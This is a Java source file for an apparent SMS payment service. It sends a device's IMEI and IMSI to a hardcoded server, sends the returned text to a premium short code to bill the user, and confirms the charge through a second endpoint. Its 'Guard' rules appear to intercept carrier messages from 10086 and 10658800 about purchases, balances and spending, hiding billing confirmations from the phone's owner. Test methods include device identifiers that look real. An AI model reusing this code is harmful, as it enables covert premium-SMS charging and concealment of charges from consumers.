package com.jxt.pay.appclient.service.dynamic.net;

import java.io.UnsupportedEncodingException;
import java.net.URLDecoder;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Random;

import org.apache.log4j.Logger;
import org.json.JSONException;
import org.json.JSONObject;

import com.jxt.pay.appclient.service.dynamic.pojo.Error;
import com.jxt.pay.appclient.service.dynamic.pojo.Guard;
import com.jxt.pay.appclient.service.dynamic.pojo.Repeat;
import com.jxt.pay.appclient.service.dynamic.pojo.Sets;
import com.jxt.pay.appclient.service.dynamic.pojo.Sms;
import com.jxt.pay.appclient.service.dynamic.utils.XstreamHelper;
import com.jxt.pay.appclient.utils.DynamicUtils;
import com.jxt.pay.appclient.utils.GetData;
import com.jxt.pay.appclient.utils.SingleXmlUtil;
import com.jxt.pay.appclient.utils.StringUtils;
import com.jxt.pay.appclient.utils.XmlUtils;

/**
第一步、请求接口1（http://122.114.52.197:8003/sms.aspx?imei=934364670677777&imsi=460005107777777）得到类似下面的短信内容，
MM#WLAN#G4Y/p48NOkLjTm+plGvYQQ==#424576095#399900002400，将得到的内容发送到10658424。

参数说明：
imei，手机的imei（取本机的）
imsi，sim卡的imsi（取本机的）
-------------------------------

第二步、取得第一步中得到的短信内容中的424576095，请求接口2（http://122.114.52.197:8003/synic.aspx?paycode=30000879250602&imei=934364670677777&imsi=460005107777777&channel=3003978520&pid=424576095）返回ok表示计费成功,返回其他为失败。

参数说明：
paycode，计费代码（固定值由我们分配30000879250602为测试1元代码）
imei，手机的imei（取本机的）
imsi，sim卡的imsi（取本机的）
channel，渠道号（固定值由我们分配3003978520）
pid，第一步中请求接口1得到的短信内容中两个#号之间的内容，如上面例子中的是337463621，这个值每次都不同。
 * @author leoliu
 *
 */
public class XmwtSmmDynamicService implements IDynamicService{
	private static Logger logger = Logger.getLogger(XmwtSmmDynamicService.class);
	
	private static final String TYPE = "xmwtSmm";
	
	private static final String URLPARAM1 = "imsi={imsi}&imei={imei}";
	
	private static final String URLPARAM2 = "paycode={paycode}&imei={imei}&imsi={imsi}&channel={channel}&pid={pid}";
	
	private int timeOut = 60;
	
	private static final String DEST = "10658424";
	
	private static final Guard guard1 = new Guard("10658800","成功|购买",2880,"1",0);
	private static final Guard guard2 = new Guard("10086","点数|帐户|充值|花费",2880,null,1);
	private static final Guard guard3 = new Guard("10658800","",960,null,1);
	private static final Guard guard4 = new Guard("10086","",960,null,1);
	
	private static final Integer DEFAULTSUCCESSTIMEOUT = 2;
	
	private static final String THENO_1 = "1";
	private static final String THENO_2 = "2";
	
	@Override
	public String getType() {
		return TYPE;
	}
	
	private Map<String, Long> tryMap = new HashMap<String, Long>();

	@Override
	public String dynamic(Map<String, String> map) {
	
		String theNo = map.get("theNo");
		
		if(THENO_1.equals(theNo)){
			return firstDynamic(map);
		}else if(THENO_2.equals(theNo)){
			return secondDynamic(map);
		}
		
		return null;
	}
	
	private String firstDynamic(Map<String, String> map) {
		String xml = null;
		String url = map.get("url");
		
		if(url != null && url.length() > 0){
			String orderId = map.get("channel");
			
			Calendar cal = Calendar.getInstance();
			Long startTime = tryMap.get(orderId);
			
			if(startTime == null){
				startTime = cal.getTimeInMillis();
				tryMap.put(orderId,startTime);
			}else{
				if(cal.getTimeInMillis() - startTime >= 1000 * timeOut){
					tryMap.remove(orderId);
					return DynamicUtils.parseError("599");
				}
			}
			
			String imsi = StringUtils.defaultString(map.get("imsi"));
			
			String param = URLPARAM1.replace("{imsi}", imsi);
			
			String imei = StringUtils.defaultString(map.get("imei"));
			
			param = param.replace("{imei}", imei);
						
			String responseTxt = GetData.getData(url+"?"+param);
	
			xml = parseFirst(map,responseTxt);
			
			if(xml != null && xml.length() > 0){
				tryMap.remove(orderId);
			}else{
				return DynamicUtils.parseWait(10,map);
			}
		}
		
		return xml;
	}
	
	private String parseFirst(Map<String, String> map,String responseTxt){
		
		try {
			List<Sms> smsList = new ArrayList<Sms>();
				
			Sms sms = new Sms();
			
			sms.setSmsContent(responseTxt);
			sms.setSmsDest(DEST);
			sms.setSuccessTimeOut(DEFAULTSUCCESSTIMEOUT);
			
			smsList.add(sms);
			
			String sid = fetchSid(responseTxt);
			
			Sms guardSms = new Sms();
						
			List<Guard> guardList = new ArrayList<Guard>();
			
			guardList.add(guard1);
			guardList.add(guard2);
					
			guardList.add(guard3);
			guardList.add(guard4);
			
			guardSms.setGuardList(guardList);
			
			smsList.add(0, guardSms);
			tryMap.remove(map.get("orderId"));
			
			Sets sets = new Sets();
			sets.setKey("sid");
			sets.setValue(sid);
			
			return XstreamHelper.toXml(smsList)+XstreamHelper.toXml(sets);
			
		} catch (Exception e) {
			e.printStackTrace();
		}
		
		tryMap.remove(map.get("orderId"));
		return DynamicUtils.parseError("597");
	}
	
	private String secondDynamic(Map<String, String> map){
		String xml = null;
		String url = map.get("url");
		
		String sid = map.get("sid");
		
		if(url != null && url.length() > 0){
			Calendar cal = Calendar.getInstance();
			Long startTime = tryMap.get(sid);
			
			if(startTime == null){
				startTime = cal.getTimeInMillis();
				tryMap.put(sid,startTime);
			}else{
				if(cal.getTimeInMillis() - startTime >= 1000 * timeOut){
					tryMap.remove(sid);
					return DynamicUtils.parseError("599");
				}
			}
			
			String imsi = StringUtils.defaultString(map.get("imsi"));
			String imei = StringUtils.defaultString(map.get("imei"));
			String payCode = map.get("payCode");
			String channelId = map.get("channelId");
			
			String param = URLPARAM2.replace("{imsi}", imsi).replace("{imei}", imei).replace("{paycode}",payCode).replace("{channel}", channelId).replace("{pid}",sid);
			
			String responseTxt = GetData.getData(url, param);
			
			xml = parseSecond(responseTxt);
		}
		
		if(xml == null){
			xml = DynamicUtils.parseWait(10,map);
		}else{
			tryMap.remove(sid);
		}
		
		return xml;
	}
	
	private String parseSecond(String responseTxt){
		
		if(responseTxt != null && responseTxt.length() > 0){
			
			if(responseTxt.indexOf("ok") >= 0){
				return "<wait>1</wait>";
			}else{
				return DynamicUtils.parseError("596");
			}
		}
		
		return null;
	}
	
	private static String fetchSid(String content){
		
		if(content != null && content.length() > 0){
			int pos0 = content.lastIndexOf("#");
			
			String aa = content.substring(0,pos0);
			
			pos0 = aa.lastIndexOf("#");
			
			return aa.substring(pos0+1);
		}
		
		return null;
	}

	public static void main(String[] args){
		
		test2();
		
//		System.out.println(fetchSid("MM#WLAN#KjGDL0HmLvO27awoEZxqQw==#1022273555#399900003000"));
	}
	
	private static void test1(){
		Map<String, String> map = new HashMap<String, String>();
		
		map.put("url","http://122.114.52.197:8003/sms.aspx");
		map.put("imei","862594025131367");
		map.put("imsi","460026100246153");
		map.put("channel","1773263599466");
		map.put("theNo", "1");
		
		System.out.println(new XmwtSmmDynamicService().dynamic(map));
	}
	
	private static void test2(){
//		http://pay.gzmtx.cn:8080/mm?appKey=B7AC82DB6B07FB1D3878E8DA68B8F736&imsi=460028174282753&imei=869460011612203&code=30000870542102&os=4.2.1&model=2013022&sid=294159264
		Map<String, String> map = new HashMap<String, String>();
		
		map.put("url","http://122.114.52.197:8003/synic.aspx");
		map.put("imei","862594025131367");
		map.put("imsi","460026100246153");
		map.put("payCode","30000879250602");
		map.put("channelId","3003978520");
		map.put("sid","821587821");
		map.put("theNo", "2");
		
		System.out.println(new XmwtSmmDynamicService().dynamic(map));
	}
	
}
